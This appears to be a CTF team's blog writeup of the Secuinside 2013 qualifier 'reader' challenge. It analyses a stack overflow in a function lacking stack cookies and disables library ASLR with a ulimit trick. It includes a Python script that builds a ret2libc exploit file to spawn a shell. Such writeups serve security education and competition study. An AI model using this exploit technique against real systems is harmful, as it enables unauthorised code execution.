
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>secuinside CTF 2013 quals reader writeup - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="We found several stack overflows in reader. One in the function of checking the filename and another in the function of parsing the file. But both &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net//secuinside-ctf-2013-quals-reader-writeup">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div id="header-inner">
    <span class="first"><a href="/">blue-lotus</a></span>
    <span><a href="/about">about</a></span>
    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
  </div>
</hgroup>

</header>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Secuinside CTF 2013 Quals Reader Writeup</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-05-31T00:00:00+08:00" pubdate data-updated="true">May 31<span>st</span>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>We found several stack overflows in <code>reader</code>. One in the function of checking the filename and another in the function of parsing the file. But both functions are protected by stack cookies. The only function that does not contain stack cookie is as below:</p>

<pre><code>int __cdecl print_file(char *buffer)
{
  unsigned int i; // [sp+18h] [bp-20h]@1
  char s[7]; // [sp+1Ch] [bp-1Ch]@1
  ……
  *((_DWORD *)buffer + 6) = &amp;i;
  ……
  sub_8048C7A(buffer);
}
</code></pre>

<p>We can see that the <code>buffer</code> pointer in the stack is passed to another function <code>sub_8048C7A</code> as below:</p>

<pre><code>int __cdecl sub_8048C7A(char *buffer)
{
  ……
  len = strlen(buffer + 83);
  copy_str(*((char **)buffer + 6), (char *)ptr, len);
  ……
}
</code></pre>

<p><code>sub_8048C7A</code> will copy a string to the stack with incorrect length. So the return address of <code>print_file</code> can be overlapped. We can specify both the length and the string source contents by deliberately constructing the input file.</p>

<p>To get a shell, we used a simple ret2libc attack. To get precise address functions in glibc, we disable ASLR of shared library by a well-known ulimit trick.</p>

<pre><code>ulimit -s unlimited
</code></pre>

<p>Python script to construct the input file is as below:</p>

<pre><code>import struct

def p(addr):
    return struct.pack("&lt;I", addr)

system_addr = p(0x4006b280)
binsh_addr = p(0x40192ff8)
ret2libc = system_addr + "aaaa" + binsh_addr

f = open('exploit.sec', 'w')
b = "\xff"+"SECUINSIDE"+"\x00"+"a"*12+"\x00"+"b"*15+"1234"+"a"*8+"c"*10+"b"*50+"\xff"*4
b +='\x05\x00\x00\x00' # buffer1
b +='\x32\x00\x00\x00' # buffer2
b +='\x05\x00\x00\x00' # buffer3
b +='\x10\x00\x00\x00'
b +='\x01'
b += 'a' * 5 
b += 'a' * 36 + ret2libc + 'b'*(50 - len(ret2libc) - 36)
b += 'a' * 5
f.write(b)
f.close
</code></pre>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">kelwin</span></span>

      








  


<time datetime="2013-05-31T00:00:00+08:00" pubdate data-updated="true">May 31<span>st</span>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/secuinside-ctf-quals-2013-pe_time-writeup/" title="Previous Post: secuinside CTF Quals 2013 PE_Time writeup">&laquo; secuinside CTF Quals 2013 PE_Time writeup</a>
      
      
        <a class="basic-alignment right" href="/secuinside-ctf-2013-quals-secure-web-writeup/" title="Next Post: secuinside CTF 2013 quals secure web writeup">secuinside CTF 2013 quals secure web writeup &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/">Codegate CTF Quals 2014 Weirdshark Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/">Codegate CTF Quals 2014 Weird_snus Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/">Codegate CTF Quals 2014 Web Proxy Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/">Codegate CTF Quals 2014 Clone Technique Writeup</a>
      </li>
    
      <li class="post">
        <a href="/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/">Codegate CTF Quals 2014 Chrono Writeup</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'bluelotus';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>











</body>
</html>
